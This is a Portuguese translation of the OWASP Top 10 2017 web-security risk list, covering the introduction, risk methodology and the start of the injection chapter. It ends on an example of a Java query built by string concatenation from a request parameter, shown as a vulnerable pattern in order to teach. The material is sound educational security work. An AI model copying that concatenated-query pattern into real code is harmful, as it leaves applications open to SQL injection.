<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>OWASP Top 10 2017</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">OWASP Top 10 2017</h1>
</header>
<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
<h2 id="owasp-top-10-2017">OWASP Top 10 2017</h2>
<p>Os Dez Riscos de Segurança Mais Críticos em Aplicações Web</p>
<h3 id="versão-em-português-do-brasil-pt-br">Versão em Português do Brasil (PT-BR)</h3>
<p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
<table>
<thead>
<tr class="header">
<th></th>
<th><img src="images/front-cc.png" alt="Creative Commons License Logo" /></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><a href="https://owasp.org">https://owasp.org</a></td>
<td>Este documento é publicado sob a licença Creative Commons Attribution ShareAlike 4.0.</td>
</tr>
</tbody>
</table>
<h1 id="br-versão-pt-br">BR Versão PT-BR</h1>
<h2 id="notas">Notas</h2>
<p>Esta versão do OWASP Top 10 foi desenvolvida como parte integrante da atividade conjunta dos capítulos brasileiro e português da OWASP, em prol da comunidade de programadores e da segurança das aplicações desenvolvidas nos países de língua portuguesa.</p>
<p>Este documento é baseado na versão OWASP Top 10 de 2017 e a tradução pretende ser fiel ao texto original.</p>
<p>Se encontrar algum erro de tradução, digitação, ou diagramação, favor entrar em contato com o líder do Projeto OWASP em Língua Portuguesa.</p>
<h2 id="participantes">Participantes</h2>
<p>Participaram da tradução os líderes do Projeto OWASP Top 10 em Língua Portuguesa:</p>
<ul>
<li>Fábio Kimura - <a href="mailto:fkimura@gmail.com">fkimura@gmail.com</a> - Português do Brasil</li>
<li>Márcio Machry - Português do Brasil</li>
<li>Carlos Serrão - Português de Portugal</li>
</ul>
<p>E os seguintes voluntários:</p>
<ul>
<li>Bico Tavares</li>
<li>Ícaro Torres</li>
</ul>
<h1 id="toc">TOC</h1>
<p>&lt; replace me with a toc &gt;</p>
<h1 id="o-sobre-a-owasp">O Sobre a OWASP</h1>
<h2 id="sobre-a-owasp">Sobre a OWASP</h2>
<p><em>Open Web Application Security Project</em> (OWASP) é uma comunidade aberta, dedicada a capacitar as organizações a desenvolver, adquirir e manter aplicações e APIs confiáveis.</p>
<p>Em OWASP se pode encontrar, grátis e de forma aberta...</p>
<ul>
<li>Normas e ferramentas de segurança em aplicações</li>
<li>Livros completos sobre testes de segurança, desenvolvimento de código seguro e revisão de segurança de código</li>
<li>Apresentações e vídeos</li>
<li><a href="https://cheatsheetseries.owasp.org/">Folhas de Dicas</a> sobre diversos tópicos mais comuns</li>
<li>Normas e bibliotecas de controles de segurança</li>
<li><a href="https://owasp.org/chapters/">Capítulos locais da OWASP pelo mundo</a></li>
<li>Pesquisas de última geração</li>
<li>Vastas <a href="https://owasp.org/events/">conferências do OWASP pelo mundo</a></li>
<li><a href="https://lists.owasp.org/mailman/listinfo">Listas de discussão</a></li>
</ul>
<p>Saiba mais em: <a href="https://owasp.org"><a href="https://owasp.org">https://owasp.org</a></a>.</p>
<p>Todas as ferramentas, documentos, fóruns e capítulos do OWASP são grátis e abertos a todos os interessados em aperfeiçoar a segurança em aplicações.</p>
<p>Promovemos a abordagem da segurança em aplicações como um problema de pessoas, processos e tecnologia, porque as abordagens mais eficazes em segurança de aplicações requerem melhorias nestas áreas.</p>
<p>A OWASP é um novo tipo de organização. O fato de ser livre de pressões comerciais permite fornecer informação de segurança de aplicações imparcial, prática e de custo eficiente. A OWASP não é filiada a nenhuma empresa de tecnologia, apesar de apoiar o uso de tecnologia de segurança comercial. Da mesma forma que muitos projetos de software de código aberto, a OWASP produz vários tipos de materiais de maneira colaborativa e aberta.</p>
<p>A Fundação OWASP é uma entidade sem fins lucrativos que garante o sucesso do projeto a longo prazo. Quase todos os associados à OWASP são voluntários, incluindo a Direção da OWASP, os Comitês Globais, os Líderes dos Capítulos, os Líderes de Projetos e os membros dos projetos. Apoiamos a pesquisa inovadora em segurança através de bolsas e infraestrutura.</p>
<p>Junte-se a nós!</p>
<h2 id="copyright-and-licença">Copyright and Licença</h2>
<p><img src="images/license.png" alt="license" /></p>
<p>Copyright © 2003-2021 The OWASP Foundation. Este documento é publicado sob a licença Creative Commons Attribution ShareAlike 4.0. Para qualquer tipo de reutilização ou distribuição, os termos deste trabalho deverão ser informados.</p>
<h2 id="prefácio">Prefácio</h2>
<p>Software inseguro está prejudicando nossas infra-estruturas financeira, de saúde, de defesa, de energia, entre outras. À medida que nosso software torna-se cada vez mais crítico, complexo e conectado, a dificuldade de alcançar a segurança das aplicações aumenta exponencialmente. O ritmo acelerado dos processos modernos de desenvolvimento de software torna os riscos ainda mais críticos de serem descobertos com rapidez e precisão. Não podemos mais tolerar problemas de segurança relativamente simples, como os apresentados neste OWASP Top 10.</p>
<p>Uma grande quantidade de feedback foi recebida durante a criação do OWASP Top 10-2017, mais do que qualquer outro esforço OWASP equivalente. Isso mostra quanta paixão a comunidade tem para o OWASP Top 10 e, portanto, como é crítico para o OWASP fazer um Top 10 correto para a maioria dos casos de uso.</p>
<p>Embora o objetivo original do projeto OWASP Top 10 fosse simplesmente promover a conscientização entre desenvolvedores e gerentes, tornou-se o padrão de facto de segurança de aplicativos.</p>
<p>Nesta versão, as questões e recomendações são escritas de forma concisa e testável para ajudar na adoção do OWASP Top 10 em programas de segurança de aplicações. Encorajamos organizações grandes e de alto desempenho a utilizar o <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard (ASVS)</a> se for necessário um verdadeiro padrão, mas, para a maioria, o OWASP Top 10 é um ótimo começo na jornada de segurança de aplicações.</p>
<p>Nós escrevemos uma série de sugestões de próximas etapas para diferentes usuários do OWASP Top 10, incluindo "O que fazer a seguir para desenvolvedores", "O que fazer a seguir para testadores de segurança", "O que fazer a seguir para organizações", que é adequado para CIOs e CISOs, e "O que fazer a seguir para gerentes de aplicações", que é adequado para gerentes de aplicações ou qualquer pessoa responsável pelo ciclo de vida de uma aplicação.</p>
<p>A longo prazo, incentivamos todas as equipes e organizações de desenvolvimento de software a criar um programa de segurança de aplicações compatível com sua cultura e tecnologia. Estes programas vêm em várias formas e tamanhos. Aproveite os pontos fortes da sua organização para medir e melhorar seu programa de segurança usando o Software Assurance Maturity Model.</p>
<p>Esperamos que o OWASP Top 10 seja útil para os esforços de segurança para sua aplicação. Não hesite em contactar a OWASP com suas perguntas, comentários e idéias em nosso repositório de projetos GitHub:</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
</ul>
<p>Você pode encontrar o projeto do Top 10 OWASP e suas traduções aqui:</p>
<ul>
<li><a href="https://owasp.org/www-project-top-ten/"><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></a></li>
</ul>
<p>Por último, desejamos agradecer à liderança fundadora do projeto OWASP Top 10, Dave Wichers e Jeff Williams, por todos os seus esforços e por acreditarem em nós para conseguir finalizá-lo com a ajuda da comunidade. Obrigado!</p>
<ul>
<li>Andrew van der Stock</li>
<li>Brian Glas</li>
<li>Neil Smithline</li>
<li>Torsten Gigler</li>
</ul>
<h2 id="reconhecimento">Reconhecimento</h2>
<p>Agradecimentos a <a href="https://www.autodesk.com">Autodesk</a> por patrocionar o OWASP Top 10 - 2017.</p>
<p>Organizações e indivíduos que forneceram dados de prevalência de vulnerabilidade ou outra assistência estão listados na <a href="0xd1-data-contributors.md">Página de Reconhecimentos</a>.</p>
<h1 id="i-introdução">I Introdução</h1>
<h2 id="seja-bem-vindo-ao-owasp-top-10---2017">Seja bem vindo ao OWASP Top 10 - 2017</h2>
<p>Esta importante atualização adiciona várias novas questões, incluindo duas questões selecionadas pela comunidade - A8:2017-Desserialização insegura e A10:2017-Insuficiência de Logs e monitoração. Dois diferenciais chave das edições anteriores do OWASP Top 10 são o feedback substancial da comunidade, além dos dados extensos reunidos por dezenas de organizações (possivelmente a maior quantidade de dados já reunidos na preparação de um padrão de segurança de aplicações). Isso nos proporciona uma confiança adicional de que o novo OWASP Top 10 aborda os problemas de segurança de aplicativos mais urgentes atualmente enfrentados pelas organizações.</p>
<p>O OWASP Top 10 para 2017 baseia-se principalmente em mais 40 pedidos de dados de empresas que se especializam em segurança de aplicações e uma pesquisa da indústria que foi preenchida por 515 indivíduos. Este dados abrange vulnerabilidades coletadas de centenas de organizações e mais de 100.000 aplicações e APIs do mundo real. Os 10 principais itens são selecionados e priorizados de acordo com esses dados de prevalência, em combinação com estimativas consensuais de capacidade de explorabilidade, detectabilidade e impacto.</p>
<p>Um dos principais objetivos do OWASP Top 10 é educar desenvolvedores, designers, arquitetos, gerentes e organizações sobre as conseqüências das falhas de segurança de aplicações mais comuns e mais importantes na Web. O Top 10 fornece técnicas básicas para se proteger contra essas áreas problemáticas de alto risco e fornece orientação sobre aonde ir daqui.</p>
<h2 id="roadmap-para-atividades-futuras">Roadmap para atividades futuras</h2>
<p><strong>Não pare em 10</strong>. Existem centenas de questões que podem afetar a segurança geral de uma aplicação web conforme discutido no <a href="https://github.com/OWASP/DevGuide">OWASP Developer's Guide</a> e <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>. Estas são leituras essenciais para qualquer pessoa que esteja desenvolvendo aplicações Web e APIs. As orientações sobre como encontrar efetivamente vulnerabilidades em aplicações Web e APIs são fornecidas no <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a>.</p>
<p><strong>Mudança constante</strong>. O OWASP Top 10 continuará a mudar. Mesmo sem alterar uma única linha do código da sua aplicação, você pode tornar-se vulnerável à medida que novas falhas são descobertas e os métodos de ataque são refinados. Por favor, reveja no final do Top 10 os Próximos passos para desenvolvedores, testadores, organizações e gerentes de aplicações.</p>
<p><strong>Pense positivo</strong>. Quando estiver pronto para parar de perseguir vulnerabilidades e concentrar-se em estabelecer controles fortes de segurança de aplicações, o projeto <a href="https://owasp.org/www-project-proactive-controls/">OWASP Proactive Controls</a> fornece um ponto de partida para ajudar os desenvolvedores a construir segurança em suas aplicações e o <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard (ASVS)</a> é um guia para organizações e revisores de aplicações sobre o que verificar.</p>
<p><strong>Use ferramentas com sabedoria</strong>. Vulnerabilidades de segurança podem ser bastante complexas e profundamente enterradas no código. Em muitos casos, a abordagem mais econômica para encontrar e eliminar esses pontos fracos é o conhecimento de especialistas humanos armados com boas ferramentas. Basear-se apenas em ferramentas fornece uma falsa sensação de segurança e não é recomendado.</p>
<p><strong>Pressione para esquerda, para a direita e em todos os lugares</strong>. Concentre-se em tornar a segurança uma parte integral da sua cultura em toda a sua organização de desenvolvimento. Saiba mais em <a href="https://owasp.org/www-project-samm/">OWASP Software Assurance Maturity Model (SAMM)</a>.</p>
<h2 id="reconhecimento-1">Reconhecimento</h2>
<p>Gostaríamos de agradecer as organizações que contribuíram com seus dados de vulnerabilidade que sustentaram a atualização de 2017. Recebemos mais de 40 respostas para a chamada de dados. Pela primeira vez, todos os dados que contribuíram para uma versão do Top 10, e a lista completa de contribuidores, está disponível publicamente. Acreditamos que esta é uma das coleções maiores e mais diversas de dados de vulnerabilidade já coletadas publicamente.</p>
<p>Como há mais contribuintes do que o espaço aqui, criamos uma página dedicada para reconhecer as contribuições feitas. Desejamos agradecer sinceramente a essas organizações por estarem dispostos a estar na linha de frente ao compartilhar publicamente dados de vulnerabilidade de seus esforços. Esperamos que isso continue a crescer e encorajar mais organizações a fazer o mesmo e possivelmente ser vistas como um dos principais marcos da segurança baseada em evidências. O OWASP Top 10 não seria possível sem essas incríveis contribuições.</p>
<p>Um grande agradecimento aos mais de 500 indivíduos que aproveitaram o tempo para completar a pesquisa classificada no setor. Sua voz ajudou a determinar duas novas adições ao Top 10. Os comentários adicionais, notas de encorajamento e críticas foram todos apreciados. Sabemos que seu tempo é valioso e queríamos agradecer.</p>
<p>Gostaríamos de agradecer as pessoas que contribuíram com comentários construtivos significativos e passaram a revisar esta atualização para o Top 10. Tanto quanto possível, nós os alistamos na página "Reconhecimentos". E, finalmente, gostaríamos de agradecer antecipadamente todos os tradutores que traduzam este lançamento do Top 10 em inúmeras línguas diferentes, ajudando a tornar o Top 10 da OWASP mais acessível ao planeta inteiro.</p>
<h1 id="rn-notas-da-versão">RN Notas da versão</h1>
<h2 id="o-que-mudou-de-2013-para-2017">O que mudou de 2013 para 2017?</h2>
<p>A mudança foi acelerada nos últimos quatro anos, e o OWASP Top 10 precisava mudar. Nós refatoramos completamente o OWASP Top 10, renovamos a metodologia, utilizamos um novo processo de chamada de dados, trabalhamos com a comunidade, reordenamos nossos riscos, reescrevemos cada risco desde o início e adicionamos referências a frameworks e idiomas que agora são comumente usados.</p>
<p>Ao longo dos últimos anos, a tecnologia e arquitetura fundamental das aplicações mudaram significativamente:</p>
<ul>
<li>Microsserviços desenvolvidos em node.js e Spring Boot estão substituindo aplicativos monolíticos tradicionais. Microsserviços vem com seus próprios desafios de segurança, incluindo: o estabelecimento de confiança entre eles, containers, gerenciamento de segredos, entre outros. Código legado que nunca deveria se comunicar diretamente com a Internet agora está exposto através de uma API ou serviço web RESTful para ser consumido por aplicações de página única (SPAs) e aplicativos móveis. Os pressupostos básicos do código, como os chamadores confiáveis, não são mais válidos.</li>
<li>Aplicações de página única, escritas em frameworks JavaScript, como Angular e React, permitem a criação de front ends altamente modulares e ricos em recursos. A funcionalidade do lado do cliente que tradicionalmente foi entregue no lado do servidor traz seus próprios desafios de segurança.</li>
<li>O JavaScript agora é a principal linguagem da web com node.js executando no lado do servidor e frameworks web modernos como Bootstrap, Electron, Angular e React no cliente.</li>
</ul>
<h2 id="novos-problemas-suportados-por-dados">Novos problemas, suportados por dados</h2>
<ul>
<li><strong>A4:2017-XML External Entities (XXE)</strong> é uma nova categoria primariamente suportado por dados gerados por ferramentas de análise de segurança de código fonte (source code analysis security testing tools <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>).</li>
</ul>
<h2 id="novos-problemas-suportados-pela-comunidade">Novos problemas, suportados pela comunidade</h2>
<p>Pedimos à comunidade que fornecesse informações sobre duas categorias de fraquezas futuras. Após mais de 500 envios e remoção de problemas que já eram suportados por dados (como Sensitive Data Exposure e XXE), os dois novos problemas são:</p>
<ul>
<li><strong>A8:2017-Desserialização Insegura</strong>, que permite execução de código remoto ou manipulação de objetos sensíveis nas plataformas afetadas.</li>
<li><strong>A10:2017-Insuficiência de Logs e Monitoração</strong>, a falta destes pode impedir ou atrasar significativamente a detecção de atividades maliciosas e brechas, respostas de incidentes e forense digital.</li>
</ul>
<h2 id="aposentados-mas-não-esquecidos">Aposentados, mas não esquecidos</h2>
<ul>
<li><strong>A4-Referências Insegura e Direta a Objetos</strong> e <strong>A7-Falta de Função para Controle do Nível de Acesso</strong> foram unidos em <strong>A5:2017-Quebra de Controle de Acesso</strong>.</li>
<li><strong>A8-Cross-Site Request Forgery (CSRF)</strong>, Frameworks comumente já incluem defesas contra CSRF defenses, com &lt; 5% de todas as aplicações, agora #13.</li>
<li><strong>A10-Unvalidated Redirects and Forwards</strong>, menos de 1% do conjunto de dados reportam este problema hoje, agora #25</li>
</ul>
<p><img src="images/0x06-release-notes-1.png" alt="0x06-release-notes-1" /></p>
<h1 id="risco---riscos-de-segurança-de-aplicações">Risco - Riscos de Segurança de Aplicações</h1>
<h2 id="o-que-são-os-riscos-de-segurança-de-aplicações">O Que São os Riscos de Segurança de Aplicações?</h2>
<p>Os atacantes podem usar potencialmente muitos caminhos diferentes através da sua aplicação para afetar o seu negócio ou organização. Cada um destes caminhos representa um risco que pode, ou não, ser suficientemente sério para requerer atenção.</p>
<p><img src="images/0x10-risk-1.png" alt="App Security Risks" /></p>
<p>Por vezes, estes caminhos são triviais de encontrar e explorar, por outras são extremamente difíceis. De forma semelhante, o dano causado pode não ter consequências, ou pode destruir o seu negócio. Para determinar o risco para a sua organização, você pode avaliar a probabilidade associada com cada agente de ameaça, vetor de ataque, e vulnerabilidades de segurança e combiná-las com a estimativa do impacto técnico e de negócio na organização. Em conjunto, estes fatores determinam o risco global.</p>
<h2 id="qual-o-meu-risco">Qual o meu Risco</h2>
<p>O <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> foca na identificação dos riscos mais graves para uma ampla gama de organizações. Para cada um desses riscos, fornecemos informações genéricas sobre probabilidade e impacto técnico usando o seguinte esquema de classificação simples, que é baseado na Metodologia de Classificação de Risco da OWASP.</p>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça</th>
<th>Explorabilidade</th>
<th>Prevalência da Vulnerabilidade</th>
<th>Detectabilidade da Vulnerabilidade</th>
<th>Impactos Técnicos</th>
<th>Impactos de Negócio</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Específico da Aplicação</td>
<td>Fácil 3</td>
<td>Generalizada 3</td>
<td>Fácil 3</td>
<td>Severo 3</td>
<td>Específicos da Aplicação/Negócio</td>
</tr>
<tr class="even">
<td>Específico da Aplicação</td>
<td>Médio 2</td>
<td>Comum 2</td>
<td>Médio 2</td>
<td>Moderado 2</td>
<td>Específicos da Aplicação/Negócio</td>
</tr>
<tr class="odd">
<td>Específico da Aplicação</td>
<td>Difícil 1</td>
<td>Pouco Comum 1</td>
<td>Difícil 1</td>
<td>Menor 1</td>
<td>Específicos da Aplicação/Negócio</td>
</tr>
</tbody>
</table>
<p>Nesta edição, atualizamos o sistema de classificação de risco para auxiliar no cálculo da probabilidade e impacto de qualquer dado risco. Para obter mais detalhes, consulte <a href="0xc0-note-about-risks.md">Nota sobre riscos</a>.</p>
<p>Cada organização é única, e também os atores de ameaça para essa organização, seus objetivos e o impacto de qualquer violação. Se uma organização de interesse público usa um sistema de gerenciamento de conteúdo (CMS) para informações públicas e um sistema de saúde usa o mesmo CMS exato para registros de saúde sensíveis, os atores de ameaça e os impactos de negócios podem ser muito diferentes para o mesmo software. É fundamental compreender o risco para sua organização com base em agentes de ameaças aplicáveis e impactos comerciais.</p>
<p>Sempre que possível, os nomes dos riscos no Top 10 estão alinhados com as fraquezas <a href="https://cwe.mitre.org/">Common Weakness Enumeration</a> (CWE) para promover práticas de segurança geralmente aceitas e para reduzir possíveis confusões.</p>
<h2 id="referências">Referências</h2>
<h3 id="owasp">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">OWASP Risk Rating Methodology</a></li>
<li><a href="https://owasp.org/www-community/Threat_Modeling">Article on Threat/Risk Modeling</a></li>
</ul>
<h3 id="externas">Externas</h3>
<ul>
<li><a href="https://www.iso.org/iso-31000-risk-management.html">ISO 31000: Risk Management Std</a></li>
<li><a href="https://www.iso.org/isoiec-27001-information-security.html">ISO 27001: ISMS</a></li>
<li><a href="https://www.nist.gov/cyberframework">NIST Cyber Framework (US)</a></li>
<li><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/strategies-mitigate-cyber-security-incidents">ASD Strategic Mitigations (AU)</a></li>
<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">NIST CVSS 3.0</a></li>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">Microsoft Threat Modelling Tool</a></li>
</ul>
<h1 id="t10-owasp-top-10-riscos-de-segurança-em-aplicações--2017">T10 OWASP Top 10 Riscos de Segurança em Aplicações – 2017</h1>
<p>| Risco | Descrição | | -- | -- | | A1:2017-Injeção | Falhas de injeção, como injeção SQL, NoSQL, OS e LDAP, ocorrem quando dados não confiáveis são enviados para um interpretador como parte de um comando ou consulta. Os dados hostis do atacante podem enganar o interpretador para executar comandos não intencionais ou acessar dados sem a devida autorização. | | A2:2017-Quebra de Autenticação | As funções de aplicativos relacionadas à autenticação e ao gerenciamento de sessão geralmente são implementadas incorretamente, permitindo que os atacantes comprometam senhas, chaves ou tokens de sessão ou ainda explorem outras falhas de implementação para assumir a identidade de outros usuários (temporariamente ou permanentemente). | | A3:2017-Exposição de Dados Sensíveis | Muitas aplicações web e APIs não protegem de forma adequada dados sensíveis, como financeiros, de saúde e dados pessoais. Os atacantes podem roubar ou modificar esses dados pouco protegidos para conduzir fraudes em cartões de crédito, roubo de identidade ou outros crimes. Os dados sensíveis merecem proteção extra, como criptografia em repouso ou em trânsito, bem como precauções especiais quando trocados com o navegador. | | A4:2017-XML External Entities (XXE) | Muitos processadores XML mais antigos ou mal configurados avaliam referências de entidades externas em documentos XML. Entidades externas podem ser usadas para divulgar arquivos internos usando o manipulador de URI do arquivo, compartilhamentos de arquivos internos, escanear portas internas, executar código remoto e ataques de negação de serviço (DoS), como o ataque Billion Laughs. | | A5:2017-Quebra de Controle de Acesso | As restrições sobre o que os usuários autenticados são autorizados a fazer muitas vezes não são devidamente aplicadas. Os atacantes podem explorar essas falhas para acessar funcionalidades e/ou dados não autorizados, como acessar contas de outros usuários, visualizar arquivos sensíveis, modificar dados de outros usuários, alterar direitos de acesso, etc. | | A6:2017-Configuração Incorreta de Segurança | A falta de configuração de segurança é o problema mais comum. Isso geralmente é resultado de configurações predefinidas inseguras, configurações completas ou sob demanda, armazenamento em nuvem aberta, cabeçalhos HTTP mal configurados e mensagens de erro verbosas contendo informações confidenciais. Não só todos os sistemas operacionais, frameworks, bibliotecas e aplicações devem ser configurados de forma segura, mas também devem ser corrigidos / atualizados em tempo hábil. | | A7:2017-Cross-Site Scripting (XSS) | As falhas XSS ocorrem sempre que uma aplicação inclui dados não confiáveis em uma nova página da Web sem validação ou filtros adequados, ou atualiza uma página da Web existente com dados fornecidos pelo usuário usando uma API do navegador que pode criar JavaScript. O XSS permite que os invasores executem scripts no navegador da vítima, que podem seqüestrar sessões de usuários, desfigurar sites ou redirecionar o usuário para sites mal-intencionados. | | A8:2017-Desserialização Insegura | A deserialização insegura geralmente leva à execução remota de código. Mesmo que as falhas de deserialização não resultem na execução remota de código, elas podem ser usadas para realizar ataques, incluindo ataques de repetição, ataques de injeção e ataques de escalação de privilégios. | | A9:2017-Utilização de Componentes com Vulnerabilidades Conhecidas | Componentes, tais como bibliotecas, frameworks e outros módulos de software, são executados com os mesmos privilégios que a aplicação. Se um componente vulnerável for explorado, esse ataque pode facilitar a perda séria de dados ou comprometimento do servidor. Aplicações e APIs que usam componentes com vulnerabilidades conhecidas podem prejudicar as defesas da aplicação e permitir uma gama de ataques e impactos. | | A10:2017-Logs e Monitoração Insuficientes | Logs e monitoração insuficientes, juntamente com a integração ausente ou ineficaz com resposta a incidentes, permitem que atacantes ataquem sistemas, mantenham persistência, se espalhando para mais sistemas e interfiram, extraiam ou destruam dados. A maioria dos estudos de invasão mostram que o tempo para detectar uma invasão é de mais de 200 dias, normalmente detectado por terceiros em vez de processos internos ou monitoração. |</p>
<h1 id="a12017-injeção">A1:2017 Injeção</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 3</td>
<td>Prevalência 2 | Detectabilidade 3</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>Quase qualquer fonte de dados pode ser um vetor de injeção, variáveis de ambiente, parâmetros, web services externas e internas e todos os tipos de usuários. <a href="https://owasp.org/www-community/Injection_Flaws">Falhas de injeção</a> ocorrem quando um atacante pode enviar dados hostis a um interpretador.</td>
<td>As falhas de injeção são muito comuns, particularmente em código legado. As vulnerabilidades de injeção são freqüentemente encontradas em consultas SQL, LDAP, XPath ou NoSQL; Comandos de SO; parsers XML, cabeçalhos SMTP, expression languages e consultas ORM. As falhas de injeção são fáceis de descobrir ao examinar o código. Scanners e fuzzers podem ajudar os atacantes a encontrar falhas de injeção.</td>
<td>Injeção pode resultar em perda ou corrupção de dados, falta de responsabilização ou negação de acesso. A injeção pode levar a que um atacante possa controlar completamente o servidor. O impacto comercial depende das necessidades de proteção da sua aplicação ou dos seus dados.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável">A Aplicação Está Vulnerável?</h2>
<p>Uma aplicação é vulnerável a este ataque quando:</p>
<ul>
<li>Quando os dados fornecidos pelo usuário não são validados, filtrados ou limpos pela aplicação.</li>
<li>Dados hostis são usados diretamente em pesquisas dinâmicas ou invocações não parametrizadas para um interpretador sem terem sido filtrados de acordo com o seu contexto.</li>
<li>Os dados hostis são usados diretamente nos parâmetros de busca de mapeamento de objetos-relacionamentos (ORM) para extrair registros adicionais e sensíveis.</li>
<li>Algumas das injeções mais comuns são SQL, NoSQL, comando do sistema operacional, ORM, LDAP e Expression Language (EL) ou injeção OGNL. O conceito é idêntico entre todos os intérpretes. A revisão do código-fonte é o melhor método para detectar se suas aplicações estão vulneráveis a injeções, seguidos de perto por testes automatizados completos de todos os parâmetros, cabeçalhos, URL, cookies, JSON, SOAP e entradas de dados XML. Organizações podem incluir testes de código fonte estáticos (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>) e testes dinâmicos de aplicação (<a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a>) no fluxo de CI/CD (<em>Continuous Integration/Continuous Delivery</em>) para identificar as falhas de injeção recém-introduzidas antes da implantação em produção.</li>
</ul>
<h2 id="como-prevenir">Como Prevenir</h2>
<p>Prevenir injeções requer que os dados estejam separados dos comandos e das consultas.</p>
<ul>
<li>A opção preferida é usar uma API segura, o que evite o uso exclusivo do interpretador ou que forneça uma interface parametrizada ou migrar para usar Object Relational Mapping Tools (ORMs). <strong>Nota</strong>: quando parametrizados, stored procedures ainda podem introduzir injeção de SQL se o PL/SQL ou T-SQL concatenar consultas e dados, ou executar dados hostis com EXECUTE IMMEDIATE ou exec ().</li>
<li>Use a validação positiva de entrada do lado do servidor ou "lista branca", mas isso não é uma defesa completa, pois muitas aplicações requerem caracteres especiais, como áreas de texto ou APIs para aplicativos móveis.</li>
<li>Para quaisquer consultas dinâmicas remanescentes, processe os caracteres especiais usando a sintaxe de escape específica para esse interpretador. <strong>Nota</strong>: Estruturas de SQL, como nomes de tabela, nomes de colunas, etc., não pode ser escapadas e, portanto, os nomes de estrutura fornecidos pelo usuário são perigosos. Este é um problema comum em software que produz relatórios.</li>
<li>Use o LIMIT e outros controles de SQL dentro das consultas para prevenir a revelação não autorizada de grandes volumes de registros no caso de injeção de SQL.</li>
</ul>
<h2 id="exemplos-de-cenários-de-ataque">Exemplos de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: Uma aplicação usa dados não confiáveis na construção da seguinte chamada de SQL vulnerável:</p>
<p><code>String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</code></p>
